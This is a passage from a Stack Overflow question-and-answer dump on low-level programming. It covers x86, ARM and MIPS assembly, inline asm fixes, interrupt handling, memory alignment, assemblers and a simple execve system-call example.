<p>Another specific type of handle is the <em>file descriptor</em> returned from the POSIX-standard interface named <code>open()</code>.  This function is implemented in the C run-time library on platforms such as Linux,  Windows NT, Mac OS, and many other systems.  The integer returned from a call to <code>open()</code> may not be a negative number.</p>

<p>Unless you are running under DOS, your file handles are probably provided by the Windows NT Operating System.  These file handles are returned from <code>CreateFile()</code> (which is used to open as well as create files), and the only illegal value for a handle returned from this function is <code>INVALID_HANDLE_VALUE</code>.  I.e., the Windows NT API may return what would be considered (via casting) a ""negative"" integer, although it has opened the file.</p>

<p>In all of these cases, the file handle is used to refer to some data structure that keeps track of how the file is open.  One important thing which is tracked is the current file <em>position</em>.  The position or <em>pointer</em> is set in POSIX by the <code>lseek()</code> function and is read by the <code>tell()</code> function.  Any <code>read()</code> or <code>write()</code> takes place from the position of the current file pointer.</p>

<p>Your program can open the same file under two different handles.  In this case, the file pointer for each handle is distinct.  Updating the file pointer of one handle using <code>lseek()</code> will not affect the file pointer of the other handle to the same file.</p>

<p><a href=""https://rads.stackoverflow.com/amzn/click/020163287X"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/aC9m7.jpg"" alt=""Undocumented DOS""></a></p>
","6112977"
"Force visual studio to always 'rebuild all' when debugging","12497","","<p>Edit: Basically what I need is for visual studio to always rebuild all when I hit debug.</p>

<hr>

<p>I'm currently using visual studio to compile my assembly programs, using MASM and in general it's working fine.</p>

<p>However I've run into an annoying issue:</p>

<p>If I include a file (say, a file with functions) like this</p>

<pre><code>Include functions.inc
</code></pre>

<p>and compile it, it originally works fine. However if I then <em>change</em> the contents of functions.inc, this is not recognized and the compilers skips over functions.inc and uses the old version from before I changed it.</p>

<p>I cannot find an option anywhere under project properties to fix this. However I'm sure it has something to do with linker options or something - if I make any changes under project properties (even if I change something and change it back, and then press OK), it does compile properly with the new version of functions.inc.</p>

<p>Any ideas?</p>
","<p>You can change the behaviour via the <code>EnvironmentEvents</code> macro in Visual Studio's Macro Explorer:</p>

<pre><code>Private Enum IDEMode
    Design = 1
    Break = 2
    Run = 3
End Enum

Private _IDEMode As IDEMode = IDEMode.Design

Public Sub DTEDebuggerEvents_OnDebugRun() Handles _
DebuggerEvents.OnEnterRunMode
    If _IDEMode = IDEMode.Design Then
        DTE.ExecuteCommand(""Build.RebuildSolution"")
    End If
    _IDEMode = IDEMode.Run
End Sub

Public Sub DTEDebuggerEvents_OnDebugDesign() Handles _
    DebuggerEvents.OnEnterDesignMode
    _IDEMode = IDEMode.Design
End Sub

Public Sub DTEDebuggerEvents_OnDebugBreak() Handles _
    DebuggerEvents.OnEnterBreakMode
    _IDEMode = IDEMode.Break
End Sub
</code></pre>

<p>This is a VisualStudio change so it will work across all solutions once set</p>

<p><strong>UPDATE</strong>
The above solution works, however it has some pitfalls concerning content files where the IDE will change to design mode even if the debugger is running. It <em>will</em> try to build while the debugger is running in some situations. The proper solution is this:</p>

<pre><code>Private _curDebugState As EnvDTE80.dbgProcessState

Public Sub debuggerStateChangedHandler
    (ByVal NewProcess As EnvDTE.Process, 
    ByVal processState As EnvDTE80.dbgProcessState) 
    Handles DebuggerProcessEvents.OnProcessStateChanged
    If _curDebugState = dbgProcessState.dbgProcessStateStop And processState = dbgProcessState.dbgProcessStateRun Then
        DTE.ExecuteCommand(""Build.RebuildSolution"")
    End If
    _curDebugState = processState
End Sub
</code></pre>
","3607959"
"gcc inline assembly - operand type mismatch for `add', trying to create branchless code","12497","","<p>I'm trying to do some Code Optimization to Eliminate Branches, the original c code is</p>

<pre><code>if( a &lt; b ) 
   k = (k&lt;&lt;1) + 1;
else
   k = (k&lt;&lt;1)
</code></pre>

<p>I intend to replace it with assembly code like below</p>

<pre><code>mov a, %rax 
mov b, %rbx
mov k, %rcx
xor %rdx %rdx
shl 1, %rcx
cmp %rax, %rax
setb %rdx
add %rdx,%rcx
mov %rcx, k 
</code></pre>

<p>so I write c inline assembly code like blow, </p>

<pre><code>#define next(a, b, k)\
 __asm__(""shl $0x1, %0; \
         xor %%rbx, %%rbx; \
         cmp %1, %2; \
         setb %%rbx; \
         addl  %%rbx,%0;"":""+c""(k) :""g""(a),""g""(b))
</code></pre>

<p>when I compile the code below i got error:</p>

<pre><code>operand type mismatch for `add'
operand type mismatch for `setb'
</code></pre>

<p>How can I fix it?</p>
","<p>Here are the mistakes in your code:</p>

<ol>
<li><em>Error: operand type mismatch for 'cmp'</em> -- One of <strong>CMP</strong>'s operands must be a register. You're probably generating code that's trying to compare two immediates. Change the second operand's constraint from <strong>""g""</strong> to <strong>""r""</strong>. (See <a href=""http://gcc.gnu.org/onlinedocs/gcc/Simple-Constraints.html#Simple-Constraints"" rel=""noreferrer"">GCC Manual - Extended Asm - Simple Constraints</a>)</li>
<li><em>Error: operand type mismatch for 'setb'</em> -- <strong>SETB</strong> only takes 8 bit operands, i.e.  <code>setb %bl</code> works while <code>setb %rbx</code> doesn't.</li>
<li>The C expression <code>T = (A &lt; B)</code> should translate to <code>cmp B,A; setb T</code> in AT&amp;T x86 assembler syntax. You had the two operands to <strong>CMP</strong> in the wrong order. Remember that <strong>CMP</strong> works like <strong>SUB</strong>.</li>
</ol>

<p>Once you realize the first two error messages are produced by the assembler, it follows that the trick to debugging them is to look at the assembler code generated by gcc. Try <code>gcc $CFLAGS -S t.c</code> and compare the problematic lines in <code>t.s</code> with an <a href=""http://ref.x86asm.net/coder.html"" rel=""noreferrer"">x86 opcode reference</a>. Focus on the allowed <a href=""http://ref.x86asm.net/index.html#Instruction-Operand-Codes"" rel=""noreferrer"">operand codes</a> for each instruction and you'll quickly see the problems.</p>

<p>In the fixed source code posted below, I assume your operands are unsigned since you're using <strong>SETB</strong> instead of <strong>SETL</strong>. I switched from using <strong>RBX</strong> to <strong>RCX</strong> to hold the temporary value because <strong>RCX</strong> is a call clobbered register in the ABI and used the <code>""=&amp;c""</code> constraint to mark it as an <em>earlyclobber</em> operand since <strong>RCX</strong> is cleared before the inputs  <code>a</code> and <code>b</code> are read:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;inttypes.h&gt;

static uint64_t next(uint64_t a, uint64_t b, uint64_t k)
{
    uint64_t tmp;
    __asm__(""shl $0x1, %[k];""
        ""xor %%rcx, %%rcx;""
        ""cmp %[b], %[a];""
        ""setb %%cl;""
        ""addq %%rcx, %[k];""
        : /* outputs */ [k] ""+g"" (k), [tmp] ""=&amp;c"" (tmp)
        : /* inputs  */ [a] ""r"" (a), [b] ""g"" (b)
        : /* clobbers */ ""cc"");
    return k;
}

int main()
{
    uint64_t t, t0, k;
    k = next(1, 2, 0);
    printf(""%"" PRId64 ""\n"", k);

    scanf(""%"" SCNd64 ""%"" SCNd64, &amp;t, &amp;t0);
    k = next(t, t0, k);
    printf(""%"" PRId64 ""\n"", k);

    return 0;
}
</code></pre>

<p><strong>main()</strong> translates to:</p>

<pre><code>&lt;+0&gt;:   push   %rbx
&lt;+1&gt;:   xor    %ebx,%ebx
&lt;+3&gt;:   mov    $0x4006c0,%edi
&lt;+8&gt;:   mov    $0x1,%bl
&lt;+10&gt;:  xor    %eax,%eax
&lt;+12&gt;:  sub    $0x10,%rsp
&lt;+16&gt;:  shl    %rax
&lt;+19&gt;:  xor    %rcx,%rcx
&lt;+22&gt;:  cmp    $0x2,%rbx
&lt;+26&gt;:  setb   %cl
&lt;+29&gt;:  add    %rcx,%rax
&lt;+32&gt;:  mov    %rax,%rbx
&lt;+35&gt;:  mov    %rax,%rsi
&lt;+38&gt;:  xor    %eax,%eax
&lt;+40&gt;:  callq  0x400470 &lt;printf@plt&gt;
&lt;+45&gt;:  lea    0x8(%rsp),%rdx
&lt;+50&gt;:  mov    %rsp,%rsi
&lt;+53&gt;:  mov    $0x4006c5,%edi
&lt;+58&gt;:  xor    %eax,%eax
&lt;+60&gt;:  callq  0x4004a0 &lt;__isoc99_scanf@plt&gt;
&lt;+65&gt;:  mov    (%rsp),%rax
&lt;+69&gt;:  mov    %rbx,%rsi
&lt;+72&gt;:  mov    $0x4006c0,%edi
&lt;+77&gt;:  shl    %rsi
&lt;+80&gt;:  xor    %rcx,%rcx
&lt;+83&gt;:  cmp    0x8(%rsp),%rax
&lt;+88&gt;:  setb   %cl
&lt;+91&gt;:  add    %rcx,%rsi
&lt;+94&gt;:  xor    %eax,%eax
&lt;+96&gt;:  callq  0x400470 &lt;printf@plt&gt;
&lt;+101&gt;: add    $0x10,%rsp
&lt;+105&gt;: xor    %eax,%eax
&lt;+107&gt;: pop    %rbx
&lt;+108&gt;: retq   
</code></pre>

<p>You can see the result of <code>next()</code> being moved into <strong>RSI</strong> before each <code>printf()</code> call.</p>
","14024193"
"Assembly language to C","12467","","<p>So I have the following assembly language code which I need to convert into C. I am confused on a few lines of the code.</p>

<p>I understand that this is a <code>for</code> loop. I have added my comments on each line.</p>

<p>I think the <code>for</code> loop goes like this</p>

<pre><code>for (int i = 1; i &gt; 0; i &lt;&lt; what?) {
    //Calculate result
}
</code></pre>

<p>What is the test condition? And how do I change it?</p>

<p>Looking at the assembly code, what does the variable 'n' do?</p>

<p>This is Intel x86 so the format is movl = source, dest</p>

<pre><code>  movl 8(%ebp), %esi     //Get x
  movl 12(%ebp), %ebx    //Get n
  movl $-1, %edi         //This should be result
  movl $1, %edx          //The i of the loop
.L2:
  movl %edx, %eax
  andl %esi, %eax
  xorl %eax, %edi        //result = result ^ (i &amp; x)
  movl %ebx, %ecx        //Why do we do this? As we never use $%ebx or %ecx again
  sall %cl, %edx         //Where did %cl come from?
  testl %edx, %edx       //Tests if i != what? - condition of the for loop
  jne .L2                //Loop again
  movl %edi, %eax        //Otherwise return result.
</code></pre>
","<p><code>sall %cl, %edx</code> shifts %edx left by <code>%cl</code> bits.  (<code>%cl</code>, for reference, is the low byte of <code>%ecx</code>.)  The subsequent <code>testl</code> tests whether that shift zeroed out %edx.</p>

<p>The <code>jne</code> is called that because it's often used in the context of comparisons, which in ASM are often just subtractions.  The flags would be set based on the difference; ZF would be set if the items are equal (since x - x == 0).  It's also called <code>jnz</code> in Intel syntax; i'm not sure whether GNU allows that too.</p>

<p>All together, the three instructions translate to <code>i &lt;&lt;= n; if (i != 0) goto L2;</code>.  That plus the label seem to make a for loop.</p>

<pre><code>for (i = 1; i != 0; i &lt;&lt;= n) { result ^= i &amp; x; }
</code></pre>

<p>Or, more correctly (but achieving the same goal), a do...while loop.</p>

<pre><code>i = 1;
do { result ^= i &amp; x; i &lt;&lt;= n; } while (i != 0);
</code></pre>
","4008218"
"ARM Assembly - Basic Interrupt Handling","12428","","<p>I'm currently messing around with some ARM Assembler on the lpc2378, I've wrote a loop to control a furnace's temperature, however; I believe I need to implement some kind of interrupt handling to complete my project.</p>

<p>When the application runs, it enters a loop, which waits for Button_1 input, the loop then carries on and goes through various stages but it cannot reach wait for Button_2 input for the application to function.</p>

<p>So a couple of questions here, how exactly does the interrupt handler work? and how could I implement it into my application.</p>

<p>Here is my Button_1 code:</p>

<pre><code>;=========================================================================
; Wait for BUT1 to be pressed
;=========================================================================
WaitBUT1
  STMFD r13!,{r0,r5,r14}   ; Push r0, r5 and LR

WaitForBUT1Pressed
    ldr r0, = IO0PIN            ; Address of FIO0PIN register 
    ldr r1, [r0]                ; Read FIO0PIN in to r1
    ands r1, r1, # B1_MASK      ; Mask out BUT1
    beq BUT1Pressed             ; Exit LED toggle loop if button is pressed
    B WaitForBUT1Pressed
BUT1Pressed

  LDMFD r13!,{r0,r5,r14}   ; Pop r0, r5 and LR
  mov pc, r14              ; Put link register back into PC
</code></pre>

<p>and my Button_2 code:</p>

<pre><code>;=========================================================================
; Wait for BUT2 to be pressed
;=========================================================================
WaitBUT2
  STMFD r13!,{r0,r5,r14}   ; Push r0, r5 and LR

WaitForBUT2Pressed
    ldr r0, = IO0PIN            ; Address of FIO0PIN register 
    ldr r1, [r0]                ; Read FIO0PIN in to r1
    ands r1, r1, # B2_MASK      ; Mask out BUT1
    beq BUT2Pressed             ; Exit LED toggle loop if button is pressed
    B WaitForBUT2Pressed
BUT2Pressed

  LDMFD r13!,{r0,r5,r14}   ; Pop r0, r5 and LR
  mov pc, r14              ; Put link register back into PC
</code></pre>

<p>and also my furnace control loop:</p>

<pre><code>LoopStart

   BL WaitBUT1 ; wait until button 1 is pressed
   BL heaterOn ; turn heater on
   BL systemLedOn ; turn system LED on
   BL readTemp ; Check ADC for temp
   BL checkTemp ; Count down, check ADC for temp
   CMP r3, #5 ; Compare timer with delay
   BGT errorVal
   SUBS r4, r2, r7  ;Performs r7 = r4 - r2 and sets condition register
   BEQ LoopStart ; if equal nothing to do
   BGT overTemp ; r7 &lt; 0 case
   BL errorLedOn
   BL heaterOn
   BL FanOff
   B LoopStart

overTemp
   BL errorLedOn
   BL heaterOff
   BL FanOn
   B LoopStart


   BL WaitBUT2
   BL FanOff
   BL errorLedOff
   BL systemLedOff
   BL heaterOff

       B LoopStart
</code></pre>

<p>Thanks in advance.</p>
","<p>If you dont have it already you need to get the ARM ARM (ARM Architectural Reference Manual).  there used to be only one but there are so many cores now they had to split it up for the different architectures.  <a href=""http://infocenter.arm.com"" rel=""noreferrer"">http://infocenter.arm.com</a>  along the left side ARM Architecture, then Reference Manuals, then ARMv5, yes I know you have an ARMv4 (ARM7TDMI).  The ARMv5 manual is what used to be, THE manual.</p>

<p>It will cover the exception vectors and such.</p>

<p>You probably already know that on boot, the instruction at address 0x00000000 is executed.
For interrupts the instruction at address 0x00000018 is called.</p>

<pre><code>.globl _start
_start:
    b   reset     ;@ 0x00000000 reset
    b   handler   ;@ 0x00000004 undefined instruction
    b   handler   ;@ 0x00000008 software interrupt swi
    b   handler   ;@ 0x0000000C prefetch abort
    b   handler   ;@ 0x00000010 data abort
    b   handler   ;@ 0x00000014 dont know
    b    irq_handler   ;@ 0x00000018 irq
    b   handler   ;@ 0x000000
</code></pre>

<p>From the ARM ARM you should also see that the registers are banked, in particular r13 the stack pointer, there is a separate stack pointer when in interrupt mode.  So on boot, when you are setting up your normal stack you also want to setup some space for the interrupt stack.</p>

<pre><code>reset:
;@//mov r0, #(PSR_IRQ_MODE|PSR_FIQ_DIS|PSR_IRQ_DIS)
mov r0,#0xD2
msr cpsr_c, r0
ldr sp, =0xD600C000

;@//mov r0, #(PSR_SVC_MODE|PSR_FIQ_DIS|PSR_IRQ_DIS)
mov r0,#0xD3
msr cpsr_c, r0
ldr sp, =0xD600B000
</code></pre>

<p>at some point you need to enable the interrupt in the cpsr.  you might wait on this until you have enabled whatever interrupt in whatever peripheral (in the chip, outside the core).</p>

<pre><code>;@ SVC MODE, IRQ ENABLED, FIQ DIS
mov r0,#0x53
msr cpsr_c, r0
</code></pre>

<p>You will need to read the manual for the lpc part to understand how to enable the interrupt, as well as how to clear the interrupt when it happens.</p>

<p>The first thing you need to do in the interrupt handler (the code you branch to at address 0x18) is preserve the shared (not banked) registers on the stack so that you dont mess them up.  If you dont when you return to the code that was interrupted the registers will have changed and that code may not work.  Since your project appears to be in ASM it is possible for you to use some registers in the application and reserve some regsiters only for the isr and not have to setup the stack. If you are going to use bl anywhere in the handler you need to save lr on the stack.</p>

<p>At some point your handler needs to clear the interrupt in the peripheral so it doesnt fire again until the next interrupt, gotta read the lpc manual for that.  Yes when I say lpc I mean NXP formerly Philips...</p>

<p>The last thing is if you have pushed lr, pop it, and pop other registers if you had pushed them, then use this exact instruction and the arm will return and switch modes back to the mode that was interrupted (switching to the use of those banked registers).</p>

<pre><code>subs pc,lr,#4
</code></pre>

<p>Note you might also need, and it is generally a good idea with ARM, to get the TRM (Techincal Reference Manual) for the specific core, in your case the ARM7TDMI-S.  On the infocenter page, left side go to ARM7 Processors, not ARMv7 under architecture but lower where it has ARM11, ARM9, ARM7.  </p>

<p>Buttons can be messy with interrupts as they bounce and cause many edges on the I/O pin.  Looking at your other post I dont see where you would need an interrupt.  You should in general avoid interrupts unless otherwise necessary.  they are messy in general.  There are designs that you cant avoid using one, certainly.  And there are event driven designs where all of your code is an interrupt handler and there is nothing in the application but startup code and an infinite loop (or some sort of sleep).</p>

<p>You can use interrupts to debounce, for example, if you setup a timer interrupt and sample the I/O pins for the buttons in the interrupt, you avoid a fair amount of the bouncing, but you also risk the chance of missing a button press. Just because the button I/O pin is asserted two interrupts in a row that is not two presses, you change a state variable somewhere, and when the button is released you change the state variable.  edge changes on that state variable are of interest to the application.  when the button goes from unpressed to pressed, do something, if it goes from pressed to unpressed, dont do anything, wait for it to change from unpressed to pressed as an example.</p>

<p>You can also use the same timer interrupt to start or sample the adc.</p>

<p>Since you have not solved your other problem which is also mentioned here, I wouldnt go near interrupts.  Figure that problem out first, then decide if there is a feature you need that requires an interrupt.  Like even/regular sampling of the adc.</p>

<p>that should be more than enough to get you started.  If you do try interrupts DO NOT try them as part of this application, create a completely separate application, for example an led blinker.  change the state of the led in the interrupt handler, and/or change a global variable or register in the handler and have the forground watch for that and change the led as a result.  Always divide your problems/learning exercises into individual pieces, solve those then glue them together add one piece, test, add one piece, test.  </p>
","10648124"
"LEA or ADD instruction?","12399","","<p>When I'm handwriting assembly, I generally choose the form</p>

<pre><code>lea eax, [eax+4]
</code></pre>

<p>Over the form..</p>

<pre><code>add eax, 4
</code></pre>

<p>I have heard that lea is a ""0-clock"" instruction (like NOP), while 'add' isn't. However, when I look at compiler produced Assembly I often see the latter form used instead of the first. I'm smart enough to trust the compiler, so can anyone shed some light on which one is better? Which one is faster? Why is the compiler choosing the latter form over the former?</p>
","<p>One significant difference between <code>LEA</code> and <code>ADD</code> on x86 CPUs is the execution unit which actually performs the instruction. Modern x86 CPUs are superscalar and have multiple execution units that operate in parallel, with the pipeline feeding them somewhat like round-robin (bar stalls). Thing is, <code>LEA</code> is processed by (one of) the unit(s) dealing with addressing (which happens at an early stage in the pipeline), while <code>ADD</code> goes to the ALU(s) (arithmetic / logical unit), and late in the pipeline. That means a superscalar x86 CPU can concurrently execute a <code>LEA</code> and an arithmetic/logical instruction.</p>

<p>The fact that <code>LEA</code> goes through the address generation logic instead of the arithmetic units is also the reason why it used to be called ""zero-clocks""; it takes no time to execute because address generation <em>has already happened</em> by the time it would be / is executed.</p>

<p>It's not <em>free</em>, since address generation is a step in the execution pipeline, but it's got no execution overhead. And it doesn't occupy a slot in the ALU pipeline(s).</p>

<p><strong>Edit:</strong> To clarify, <code>LEA</code> is <strong>not free</strong>. Even on CPUs that do not implement it via the arithmetic unit it takes time to execute due to instruction decode / dispatch / retire and/or other pipeline stages that <em>all</em> instructions go through. The time taken to do <code>LEA</code> just occurs <em>in a different stage of the pipeline</em> for CPUs that implement it via address generation.</p>
","6328441"
"Learning ARM assembly","12374","","<p>During this year there will be coming couple sub-600€ multi-touch portable computers that contain Tegra2. They bring me to a good excuse to learning ARM assembly language. But I have no clue where to start from aside the arm.com.</p>

<p>For first throw I could just pick up an emulator with a linux distribution in it. But which emulator and distro would work best on this one? Having access to the host system's files would be okay so I could compile and execute ARM binaries straight from my home-directory.</p>

<p>I wouldn't want to waste much money to books so I'd need some assembly source code examples and a good free introduction to the instruction set. gcc compiler flags for compiling ARM programs on x86 would be also nice but I might find them out myself as well.</p>
","<p>Obtain an evaluation version of of <a href=""http://www.keil.com/arm/rvcomparison.asp"" rel=""noreferrer"">one of the arm software toolkits</a> which will include a debugger/software emulator. If you're willing to spend a few hundred dollars, obtain an arm eval board (<a href=""http://www.keil.com"" rel=""noreferrer"">Keil</a> sells a few). You can test your code on the board via a JTAG interface and see what happens on real hardware.</p>

<p>These should get your going in the right direction</p>

<p><em>Disclosure: I work for ARM.</em></p>
","2314009"
"Understanding Assembly MIPS .ALIGN and Memory Addressing","12339","","<p>I'm taking this course, and I'm really struggling understanding the directive <code>.align</code> concept.</p>

<p>Here's an example, which I couldn't understand:</p>

<p><img src=""https://i.stack.imgur.com/tesct.png"" alt=""enter image description here""></p>

<p>I know that inside the data segment, there are addresses, starting with 0x10010000,0x10010020,etc.</p>

<p>And I know, that inside each address, there are 8 memory fields, each has 32bit.</p>

<p>Now, what I don't understand is, how and why <code>var2</code> inside the address 0x10010010? <code>str1</code> is inside the address 0x10010003 because we reserved 3 bits for the <code>var1</code>.</p>

<p>The last thing is, what exactly the directive <code>.align' doing? when I tested it in Mars4, it only shifted the data into the next memory field when I used</code>align 3` and up, but I don't really get it.</p>

<p>I'm sorry if this is very confusing guys, I'm kind of desperate here.</p>
","<p>Alignment is important for a MIPS processor, it only likes to read multi-byte values from memory at an address that's a multiple of the data size.</p>

<p>The .ASCIIZ field can be placed anywhere since a string is read one byte at a time.  So putting it at 0x10010003 is fine.</p>

<p>The .WORD field must be aligned to a multiple of 4.  So it can't be put at 0x1001000E, the next available location after the string.  The assembler intentionally shifts the value and leaves two bytes unused.  To the next address that's a multiple of 4, 0x10010010.</p>

<p>The .ALIGN directive is a way to override the default alignment rules.  The next field after the directive will be aligned to a multiple of 2 to the power of n where n is the .ALIGN value.  In your case that's pow(2, 3) = 8 bytes.</p>

<p>Which is what you see happening, without the .ALIGN directive the .HALF field would be stored at 0x10010014.  Not a multiple of 8 so it is moved to 0x10010018.</p>

<p>The example is otherwise artificial, no obvious reason to use the .ALIGN directive here since .HALF only requires an aligment to a multiple of 2 so storing it at 0x10010014 would have been fine.</p>
","19609034"
"ASM: MASM, NASM, FASM?","12336","","<p>I have done ARM assembly programming and I would like to learn the Intel Assembler. I keep hearing all these different F/M/N/ASMs mentioned- but I am unsure how they related to what I wish to achieve?</p>

<p>Could somebody please help me identify what I would need to learn how to program low level on the Intel architecture? I dont quite understand how the ""different Assemblers"" correlate, even more so with x86, IA64, AMD64/x86-64 etc?</p>

<p>If it is of any help, I am most comfortable with Eclipse and Visual Studio 08/10 IDEs.</p>
","<p><a href=""http://en.wikipedia.org/wiki/Microsoft_Macro_Assembler"" rel=""noreferrer""><code>MASM</code></a> (Microsoft Assembler) is the popular assembler for Windows. <code>MASM</code> is for 16-bit and 32-bit applications(<code>x86</code>). <code>ML64</code> is the one for 64 bit sources (<code>AMD64/x86-64</code>)</p>

<p><a href=""http://en.wikipedia.org/wiki/Netwide_Assembler"" rel=""noreferrer""><code>NASM</code></a> (Netwide Assembler) is the popular assembler for Linux but is available on <a href=""http://www.nasm.us/pub/nasm/releasebuilds/2.10/win32/"" rel=""noreferrer"">Windows</a> too. NASM supports 16-bit, 32 bit and 64 bit programs.</p>

<p><a href=""http://flatassembler.net/"" rel=""noreferrer""><code>FASM</code></a> (Flat Assembler) is available for both Windows and Linux. FASM too supports both 32-bit and 64-bit programs.</p>

<p>So I guess you would prefer choosing <code>MASM</code> according to your requirements.</p>
","10180015"
"Decompiling EXE to ASM","12329","","<p>I want to make a basic antivirus for my free time.
Basically I learned about the basic structure of the EXE(windows) file.
How do I extract the ASM code from the file and the PE header?</p>
","<p>You can install <a href=""http://www.cygwin.com/"" rel=""noreferrer"">Cygwin</a> and use <a href=""http://en.wikipedia.org/wiki/Objdump"" rel=""noreferrer"">objdump</a> to decompile an exe into asm.  Be sure you select the binutils when installing cygwin.  After installing cygwin, you can run the following from a bash shell:</p>

<pre><code>objdump -Slx yourpgm.exe
</code></pre>
","1606547"
"MIPS load byte (lb) with offset","12296","","<p>I'm trying to load a byte from a word saved in data:</p>

<pre><code>.data
    number:
    .word w1
</code></pre>

<p>part of the .text:  </p>

<pre><code>stringlength:

    li $t2, 10
    li $t1, -1

    la $a0, number

loop:

    addiu $t1, $t1, 1

    lb $t0, $t1($a0)
    bne $t0, $t2, loop

    move $v0, $t1

jr $ra
</code></pre>

<p>*the code is not finished</p>

<p>My problem is with,  </p>

<pre><code>lb $t0, $t1($a0)
</code></pre>

<p>I'm trying to achieve a dynamic offset that will increment by 1, to check each byte in the string, to check wether it's equal to 10 (dec) or not.</p>

<p>QtSPIM raises an exception syntax error about this line,</p>

<p>What's the correct way of doing so?</p>
","<p>There is no such addressing mode, you'll just have to calculate the address yourself by adding the offset, such as:</p>

<pre><code>add $t0, $t1, $a0
lb $t0, ($t0)
</code></pre>
","13534713"
"sys_execve system call from Assembly","12280","","<p>asm_execve.s:</p>

<pre>
.section .data
file_to_run:
.ascii       ""/bin/sh""

.section .text
.globl main

main:
    pushl %ebp
    movl %esp, %ebp
    subl $0x8, %esp         # array of two pointers. array[0] = file_to_run  array[1] = 0

    movl file_to_run, %edi
    movl %edi, -0x4(%ebp)   
    movl $0, -0x8(%ebp)

    movl $11, %eax                      # sys_execve
    movl file_to_run, %ebx              # file to execute       
    leal -4(%ebp), %ecx                 # command line parameters
    movl $0, %edx                       # environment block
    int  $0x80              

    leave
    ret
</pre>

<p>makefile:</p>

<pre>
NAME = asm_execve
$(NAME) : $(NAME).s
    gcc -o $(NAME) $(NAME).s
</pre>

<p>Program is executed, but sys_execve is not called:</p>

<pre>
alex@alex32:~/project$ make
gcc -o asm_execve asm_execve.s
alex@alex32:~/project$ ./asm_execve 
alex@alex32:~/project$ 
</pre>

<p>Expected output is:</p>

<pre>
alex@alex32:~/project$ ./asm_execve 
$ exit
alex@alex32:~/project$
</pre>

<p>This Assembly program is supposed to work like the following C code:</p>

<pre>
char *data[2];
data[0] = ""/bin/sh""; 
data[1] = NULL;
execve(data[0], data, NULL);
</pre>

<p>Something wrong in system call parameters?</p>
","<p>The <code>execve</code> system call <em>is</em> being called, but you are indeed passing it bad parameters.</p>

<p>(You can see this by running your executable using <a href=""http://linux.die.net/man/1/strace""><code>strace</code></a>.)</p>

<p>There are three problems:</p>

<ol>
<li><p><code>.ascii</code> does not 0-terminate the string.  (You might get lucky, as there is nothing following it in your <code>.data</code> section in this example, but that's not guaranteed...)  Add a 0, or use <code>.asciz</code> (or <code>.string</code>) instead.</p></li>
<li><p><code>movl file_to_run, %edi</code> moves the value <em>pointed to</em> by the <code>file_to_run</code> symbol into <code>%edi</code>, i.e. the first 4 bytes of the string (<code>0x6e69622f</code>).  The <em>address</em> of the string is just the value of the symbol itself, so you need to use the <code>$</code> prefix for literal values: <code>movl $file_to_run, %edi</code>.  Similarly, you need to say <code>movl $file_to_run, %ebx</code> a few lines further down.  (This is a common source of confusion between AT&amp;T syntax and Intel syntax!)</p></li>
<li><p>The parameters are placed on the stack in the wrong order: <code>-0x8(%ebp)</code> is a lower address than <code>-0x4(%ebp)</code>.  So the address of the command string should be written to <code>-0x8(%ebp)</code>, the 0 should be written to <code>-0x4(%ebp)</code>, and the <code>leal</code> instruction should be <code>leal -8(%ebp), %ecx</code>.</p></li>
</ol>

<hr>

<p>Fixed code:</p>

<pre><code>.section .data
file_to_run:
.asciz       ""/bin/sh""

.section .text
.globl main

main:
    pushl %ebp
    movl %esp, %ebp
    subl $0x8, %esp         # array of two pointers. array[0] = file_to_run  array[1] = 0

    movl $file_to_run, %edi
    movl %edi, -0x8(%ebp)   
    movl $0, -0x4(%ebp)

    movl $11, %eax                      # sys_execve
    movl $file_to_run, %ebx              # file to execute       
    leal -8(%ebp), %ecx                 # command line parameters
    movl $0, %edx                       # environment block
    int  $0x80              

    leave
    ret
</code></pre>
","9345653"
"ARM Simulator on Windows","12241","","<p>I am studying ARM Processors from a textbook...<br/></p>

<p>I thought it will be more useful if I could apply what I learn on an ARM simulator... writing code then watching results and different execution stages would be more fun...</p>

<p>I have searched for it, but all I could find was either a freeware on linux or a demo on windows</p>

<p>Is there a simulator that allow me to see execution steps and different changes for ARM processor (any version!) that runs on windows??</p>

<p>Thanks</p>
","<p>I have a thumb emulator that should compile anywhere, windows, linux, mac, whatever.  thumbulator.blogspot.com.  Add a few printfs wherever you want to see something and you are golden.  ARMs emulator the armulator, is available in source form in many places, in the gdb sources for example.   qemu works great but is going to be hard to ""see your code"".  the best would be to have an hdl source (verilog for example) for an arm core and create vcd files or other waveform formats.  Unless you work for a chip company with an embedded arm though you probably are not going to find one.  I could be wrong but I think all the open arm cores out there are quickly taken down by ARM.  </p>

<p>mame has an arm core or two.  visual boy advance has an arm core.  the nds emulators have arm cores. </p>

<p>Or you can do what I did with the thumbulator and write your own, I found it easier than trying to get one of the others to show me what I wanted to see.  Of course I was lazy and only did a thumb instruction set emulator instead of a full arm emulator.  It is not difficult at all just time consuming.  </p>

<p>EDIT</p>

<p>Okay I stand corrected.  google the words arm verilog.  isc.tgz contains a behavioral model  model of an arm which compiles and runs just fine with icarus verilog (free).</p>

<p>Comment out all the $save_store(); lines (just like C use a //).</p>

<p>Add a few lines of code to testarm.v  (after the arm10 and before the initial begin for example).</p>

<p>initial
 begin
    $dumpfile(""test.vcd"");
    $dumpvars(0,arm10);
 end</p>

<p>always #50000  $finish;</p>

<p>then</p>

<p>iverilog -o hello testarm.v arm10.v</p>

<p>vvp hello </p>

<p>and it will run 50000 units of time, finish the sim and close out the vcd file.  To make the sim longer or shorter change the always #50000 line.   </p>

<p>Get a copy of gtkwave (free) to view the vcd file.  Using gtkwave is a whole other post, you will want to do something like click on the + sign next to test_arm, then click on the arm10 that is there, under signals click on say addr_bus to highlight the line then click on the append box, click on data_bus and click on the append button, maybe add some registers, r1, r2, etc.  There is a tool bar but you can also use the menu time->zoom->zoom full  which is ALT-F on my install.  then you get to learn how to zoom in and out on things.  </p>

<p>Speaking from personal experience, you wont ""see your code"" run any better than using an hdl simulator.  Actually once you get used to this you may have a hard time running on silicon where you pretty much cannot see anything.</p>

<p>I have not done more than run the test program that was included with that behavioral model.  dont know what you can or cant do with it.</p>

<p>A verilog $readmemh is pretty simple it just wants to read lines of hex into whatever memory specified.  So you can easily make a tool that takes your compiled arm code and creates the ascii file that the verilog simulation wants.  </p>
","2954741"
"from C to assembly","12231","","<p>can somebody please explain, I have a program on C, can I convert it to assembly? if yes, how?</p>
